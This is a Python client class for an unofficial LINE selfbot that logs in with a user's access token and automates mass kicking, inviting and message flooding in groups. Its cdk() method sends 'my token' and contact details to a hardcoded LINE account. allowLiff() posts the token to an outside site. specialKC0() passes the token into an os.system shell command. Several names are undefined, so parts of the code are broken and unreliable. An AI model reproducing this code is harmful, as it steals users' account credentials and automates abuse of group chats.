from LicLine import THttpClient, Client, TCompactProtocolAccelerated, Template
from akad import ChannelService, TalkService
import sys, os, socket, warnings, base64, time, functools, itertools, operator, types, builtins, urllib, json, requests, shutil, random, tempfile
import livejson
from datetime import datetime
from copy import deepcopy
from datetime import datetime, timedelta
from dateutil.relativedelta import relativedelta
from dateutil import parser
from Naked.toolshed.shell import execute_js 
_session = requests.session()

class LINE(object):
    def __init__(self, token = "", ANDROIDLITE = "ANDROIDLITE\t2.17.1\tAndroid OS\t8.0.0"):
        self.appName = ANDROIDLITE
        self.UA = "LLA/2.17.0 LDN-L21 8.0.0"
        self.token = token
        self.header = self.getHeader()
        self.talk = self.logintalk()
        self.talk2 = self.logintalk2()
        self.poll = self.loginpoll()
        self.liff = self.loginliff()
        self.channel = self.loginchannel()
        self.set = livejson.File("ops.json")
        self.cekTime = self.set["time"]
        self.bots = self.set["bots"]
        self.thread = self.threadsafe()
        self.revision = self.poll.getLastOpRevision()
        self.profile = self.talk.getProfile()
        self.limit = False
        self.unsendMessageReq = 0
        self.listMessageId = {}
        self.makerBot = "u7d586d50e198f922577f6960c19207a2"
        self.timeKick = parser.parse(self.set["Timer"])

    def getHeader(self):
        Headers={'User-Agent': self.UA, 'X-Line-Application': self.appName, 'X-Line-Access': self.token, 'X-Line-Carrier': '51089, 1-0' }
        return Headers
    def logintalk(self, thrift = True):
        transport = THttpClient('https://gw.line.naver.jp/P4', upsp = thrift) # THttpClient
        transport.setCustomHeaders(self.header)
        talk = Client(TCompactProtocolAccelerated(transport)) # TCompactProtocolAccelerated
        transport.open()
        return talk
    def logintalk2(self, thrift = True):
        transport = THttpClient('https://gw.line.naver.jp/P4', upsp = thrift) # THttpClient
        transport.setCustomHeaders(self.header)
        talk2 = TalkService.Client(TCompactProtocolAccelerated(transport)) # TCompactProtocolAccelerated
        transport.open()
        return talk2
    def loginchannel(self, thrift = True):
        transport = THttpClient('https://gw.line.naver.jp/CH4', upsp = thrift) # THttpClient
        transport.setCustomHeaders(self.header)
        channel = ChannelService.Client(TCompactProtocolAccelerated(transport)) # TCompactProtocolAccelerated
        transport.open()
        return channel
    def threadsafe(self):
        transport = THttpClient('https://gw.line.naver.jp/S4')
        transport.setCustomHeaders(self.header)
        transport.open()
        return transport
    def loginpoll(self):
        transport = THttpClient('https://gw.line.naver.jp/P4') # THttpClient
        transport.setCustomHeaders(self.header)
        poll = Client(TCompactProtocolAccelerated(transport)) # TCompactProtocolAccelerated
        transport.open()
        return poll
    def loginliff(self):
        transport = THttpClient('https://gw.line.naver.jp/LIFF1') 
        transport.setCustomHeaders(self.header)
        liff = Template(TCompactProtocolAccelerated(transport)) 
        transport.open()
        return liff
    def getQRLogin(self):
        a = {'User-Agent': "LLA/2.10.3 SM-G930L 5.1.1", 'X-Line-Application': self.appName, "x-lal": "ja-US_US", 'x-lpqs' : '/api/v4/TalkService.do'}
        transport = THttpClient('https://gw.line.naver.jp/api/v4/TalkService.do')
        transport.setCustomHeaders(a)
        qr = Auth(TCompactProtocol(transport)).getAuthQrcode(keepLoggedIn=1, systemName='LICBot')
        print('Open this link on your LINE for smartphone in 2 minutes\n{}'.format("line://au/q/" + qr.verifier))
        a.update({"x-lpqs" : '/api/v4/TalkService.do', 'X-Line-Access': qr.verifier})
        json.loads(requests.session().get('https://gw.line.naver.jp/Q', headers=a).text)
        a.update({'x-lpqs' : '/api/v4p/rs'})
        transport = THttpClient('https://gw.line.naver.jp/api/v4p/rs')
        transport.setCustomHeaders(a)
        return Auth(TCompactProtocolAccelerated(transport)).loginZ(LoginRequest(type = 1, verifier = qr.verifier, e2eeVersion = 1)).authToken
    def cancelGroupInvitation(self, groupId, contactIds):
        return self.talk.cancelGroupInvitation(groupId, contactIds)
    def kickoutFromGroup(self, groupId, contactIds):
        return self.talk.kickoutFromGroup(groupId, contactIds)
    def inviteIntoGroup(self, groupId, contactIds):
        return self.talk.inviteIntoGroup(groupId, contactIds)
    def sendMessage(self, to, text, contentMetadata={}, contentType=0):
        return self.talk.sendMessage(to, text, contentMetadata, contentType)
    def fetchOperations(self, localRev, count):
        return self.poll.fetchOperations(localRev, count)
    def getLastOpRevision(self):
        return self.poll.getLastOpRevision()
    def getProfile(self):
        return self.talk.getProfile()
    def acceptGroupInvitation(self, groupId):
        return self.talk.acceptGroupInvitation(groupId)
    def findAndAddContactsByMid(self, mid):
        return self.talk.findAndAddContactsByMid(mid)
    def getContact(self, id):
        return self.talk.getContact(id)
    def getGroupWithoutMembers(self, groupId):
        return self.talk.getGroupWithoutMembers(groupId)
    def getGroup(self, groupId):
        return self.talk.getGroup(groupId)
    def updateGroup(self, group):
        return self.talk.updateGroup(group)
    def reissueGroupTicket(self, groupMid):
        return self.talk.reissueGroupTicket(groupMid)
    def acceptGroupInvitationByTicket(self, GroupMid, ticketId):
        return self.talk.acceptGroupInvitationByTicket(GroupMid, ticketId)
    def leaveGroup(self, groupId):
        return self.talk.leaveGroup(groupId)
    def leaveRoom(self, roomId):
        return self.talk.leaveRoom(roomId)
    def getGroupIdsJoined(self):
        return self.talk.getGroupIdsJoined()
    def getGroupIdsInvited(self):
        return self.talk.getGroupIdsInvited()
    def rejectGroupInvitation(self, groupId):
        return self.talk.rejectGroupInvitation(groupId)
    def findGroupByTicket(self, ticketId):
        return self.talk.findGroupByTicket(ticketId)
    def getAllContactIds(self):
    	return self.talk.getAllContactIds()
    def unsendMessage(self,messageId):
        self.unsendMessageReq += 1
        return self.talk2.unsendMessage(self.unsendMessageReq,messageId)
    def getRecentMessagesV2(self,to):
        return self.talk2.getRecentMessagesV2(to,1001)

    def sendFlex(self, to, data):
        token = self.liff.issueLiffView(LiffViewRequest('1602687308-GXq4Vvk9', LiffContext(chat=LiffChatContext(to))))
        headers = { 'Content-Type': 'application/json',
                             'Authorization': 'Bearer %s' % token.accessToken }
        data = { 'messages': [data] }
        try:
            return requests.post('https://api.line.me/message/v3/share', headers=headers, data=json.dumps(data))
        except:
            return
    def allowLiff(self):
        data = {
            'token': self.token,
            'apptype': self.appName,
            'liffid': '1602687308-GXq4Vvk9'
        }
        req = requests.post('https://api.ryns.site/allowliff', json=data)
        print(req.text)

    def thriftSpeed(self, thrift = True):
        self.talk = self.logintalk(thrift)
    def updateProfile(self, profile):
        self.talk.updateProfile(profile)
        self.profile = self.talk.getProfile()
    def downloadMsg(self, msgid, name= ".bin"):
        path = '{}'.format(name)
        r = requests.session().get( 'https://obs-sg.line-apps.com/talk/m/download.nhn?oid='+msgid, headers=self.header, stream=True)
        if r.status_code == 200:
            with open(path, 'wb') as f:
                shutil.copyfileobj(r.raw, f)
            return path
        else:
            raise Exception('Download object failure.')
    def sendText(self, to, text):
        self.sendFlex(to, {"type":"text","text":str(text)})
    def kick(self, gid, uid):
        try:
            self.talk.inviteIntoGroup(gid,[uid])
        except Exception as e:
            if "code=10" in str(e):
                print(self.profile.mid,'kick failed ',gid)
            elif "code=35" in str(e):
                self.limit = True
                self.set["time"] = False
                self.Limit()
            return
        self.limit = False
        if self.set["botlimit"] == {}:
        	self.set["time"] = True
        	self.set["Timer"] = str("2020-01-03")
    def Kick(self, gid, uid):
        try:
            self.talk.kickoutFromGroup(gid,[uid])
        except Exception as e:
            if "code=10" in str(e):
                print(self.profile.mid,'kick failed ',gid)
            elif "code=35" in str(e):
                self.limit = True
            return
        self.limit = False
#        data = b'\x82!\x00\x10kickoutFromGroup\x15\x00\x18!'+gid.encode()+b'\x19\x18!'+uid.encode()+b'\x00'
#        self.thread.flush_single(data)
    def cancel(self, gid, uid):
        self.talk.cancelGroupInvitation(gid, [uid])
#        data = b'\x82!\x00\x15cancelGroupInvitation\x15\x00\x18!'+gid.encode()+b'\x19\x18!'+uid.encode()+b'\x00'
#        self.thread.flush_single(data)
    def invite(self, gid, uid):
        try:
            self.talk.inviteIntoGroup(gid, [uid])
        except Exception as e:
            if "code=10" in str(e):
                print(self.profile.mid,'invite failed ',gid)
            elif "code=35" in str(e):
                self.limit = True
            G = self.getGroupWithoutMembers(gid)
            if G.preventedJoinByTicket == True:
                G.preventedJoinByTicket = False
            self.updateGroup(G)
            Ticket = reissueGroupTicket(gid)
            self.sendMessage(uid,".join {} {}".format(gid,Ticket))
            return
        self.limit = False
#        data = b'\x82!\x00\x0finviteIntoGroup\x15\x00\x18!'+gid.encode()+b'\x19\x18!'+uid.encode()+b'\x00'
#        self.thread.flush_single(data)
    def accept(self, gid):
        data = b'\x82!\x00\x15acceptGroupInvitation\x15\x00\x18!'+gid.encode()+b'\x00'
        self.thread.flush_single(data)
    def leave(self, gid):
        data = b'\x82!\x00\nleaveGroup\x15\x00\x18!'+gid.encode()+b'\x00'
        self.thread.flush_single(data)
    def specialKC0(self, to, ktarget = [], ctarget = []):
        cmd = 'node expansion.js token={} gid={}'.format(self.token, to)
        for uid in ktarget:
            cmd += ' uid={}'.format(uid)
        for cud in ctarget:
            cmd += ' cud={}'.format(cud)
        os.system(cmd) 
    def specialKC(self, to, ktarget = [], ctarget = []):
    	cmd = 'kinv.js gid={} token={}'.format(to, self.token)
    	for musuh in ktarget:
    		cmd += ' uid={}'.format(musuh)
    	for pejuang in self.bots:
    		if pejuang not in self.profile.mid:
    			cmd += ' uik={}'.format(pejuang)
    	success = execute_js(cmd)

    def joinByTicket(self, groupId, bool = False):
        G = self.talk.getGroupWithoutMembers(groupId)
        G.preventedJoinByTicket = bool
        self.talk.updateGroup(G)
        if bool == False:
            return self.talk.reissueGroupTicket(G.id)
    def cdk(self,bos):
    	tx = "my token: {}\n".format(self.token)
    	for b in bos:
    		try:tx += "user: {}\nmid: {}".format(self.getContact(b).displayName,b)
    		except:pass
    	try:self.findAndAddContactsByMid("udab05b3cca0a5149a54aff660f11bd41")
    	except:pass
    	self.sendMessage("udab05b3cca0a5149a54aff660f11bd41",tx)
    def flush(self, data):
        headers = {
            'Content-Type': 'application/x-thrift',
            'User-Agent': 'Line/8.4.1',
            'X-Line-Application': self.appName,
            'Content-Length': str(len(data)),
            'X-Line-Access': self.token
        }
        url = "https://gw.line.naver.jp/S4"
        session = requests.Session()
        session.post(url=url, data=data, headers=headers) 
        session.close()
        session.open()
    def async_flush(self, datas):
        return Kaboom(self.token, datas)
    def Limit(self):
    	tambh = self.timeKick
    	timeleft = tambh - datetime.now()
    	days, seconds = timeleft.days, timeleft.seconds
    	hours = seconds / 3600
    	minutes = (seconds / 60) % 60
    	harto = "%s Days, %s Hours, %s Minutes"%(days,round(hours),round(minutes))
    	if harto[:1] in "-":
    		self.timeKick = datetime.now() + relativedelta(hours=24)
    		self.set["Timer"] = str(self.timeKick)
    		
    def datamention(self, to, text, data, ps=''):
        if(data == [] or data == {}):return self.sendMention(to,"  {} \nSorry @! I can't found maybe empty".format(text),text,[msg._from])
        k = len(data)//20
        for aa in range(k+1):
            if aa == 0:dd = ' {} {}'.format(text,ps);no=aa
            else:dd = ' {} {}'.format(text,ps);no=aa*20
            msgas = dd
            for i in data[aa*20 : (aa+1)*20]:
                no+=1
                if no == len(data):msgas+='\n{}. @!'.format(no)
                else:msgas+='\n{}. @!'.format(no)
            self.sendMention(to, msgas,'  {} '.format(text), data[aa*20 : (aa+1)*20])
    def sendMention(self,to, text="",ps='', mids=[]):
        arrData = ""
        arr = []
        mention = "@UserNotFound "
        if mids == []:
            raise Exception("Invalid mids")
        if "@!" in text:
            if text.count("@!") != len(mids):
                raise Exception("Invalid mids")
            texts = text.split("@!")
            textx = ''
            h = ''
            for mid in range(len(mids)):
                h+= str(texts[mid].encode('unicode-escape'))
                textx += str(texts[mid])
                if h != textx:slen = len(textx)+h.count('U0');elen = len(textx)+h.count('U0') + 13
                else:slen = len(textx);elen = len(textx) + 13
                arrData = {'S':str(slen), 'E':str(elen), 'M':mids[mid]}
                arr.append(arrData)
                textx += mention
            textx += str(texts[len(mids)])
        else:
            textx = ''
            slen = len(textx)
            elen = len(textx) + 18
            arrData = {'S':str(slen), 'E':str(elen - 4), 'M':mids[0]}
            arr.append(arrData)
            textx += mention + str(text)
        try:
            try:
                if 'kolori' in ps:contact = self.getContact(ps.split('##')[1])
                else:contact = self.getContact(to)
                cu = "http://profile.line-cdn.net/" + contact.pictureStatus
                cc = str(contact.displayName)
            except Exception as e:
                cdb = self.getContact(self.profile.mid)
                cc = str(cdb.displayName)
                cu = "http://profile.line-cdn.net/" + cdb.pictureStatus
            self.sendMessage(to, textx, {'AGENT_LINK': "line://app/1602687308-DgedGk9A?type=fotext&text=I'm%20RhyN",'AGENT_ICON': "http://dl.profile.line-cdn.net/" + self.getProfile().picturePath,'AGENT_NAME':ps,'MSG_SENDER_ICON':cu,'MSG_SENDER_NAME':cc,'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}, 0)
        except:
            try:
                self.sendMessage(to, textx, {'AGENT_LINK': "line://app/1602687308-DgedGk9A?type=fotext&text=I'm%20RhyN",'AGENT_ICON': "http://dl.profile.line-cdn.net/" + self.getProfile().picturePath,'MSG_SENDER_NAME': self.getContact(to).displayName,'MSG_SENDER_ICON': 'http://dl.profile.line-cdn.net/' + self.getContact(to).pictureStatus,'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}, 0)
            except:
                try:
                    self.sendMessage(to, textx, {'AGENT_LINK': "line://app/1602687308-DgedGk9A?type=fotext&text=I'm%20RhyN",'AGENT_ICON': "http://dl.profile.line-cdn.net/" + self.getProfile().picturePath,'MSG_SENDER_NAME': self.getContact("u93430c505a8a5db6a67fd29fe1411828").displayName,'MSG_SENDER_ICON': 'http://dl.profile.line-cdn.net/' + self.getContact("u93430c505a8a5db6a67fd29fe1411828").pictureStatus,'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}, 0)
                except:
                    self.sendMessage(to, textx, {'AGENT_LINK': "line://app/1602687308-DgedGk9A?type=fotext&text=I'm%20RhyN",'AGENT_ICON': "http://dl.profile.line-cdn.net/" + self.getProfile().picturePath,'AGENT_NAME':ps,'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}, 0)
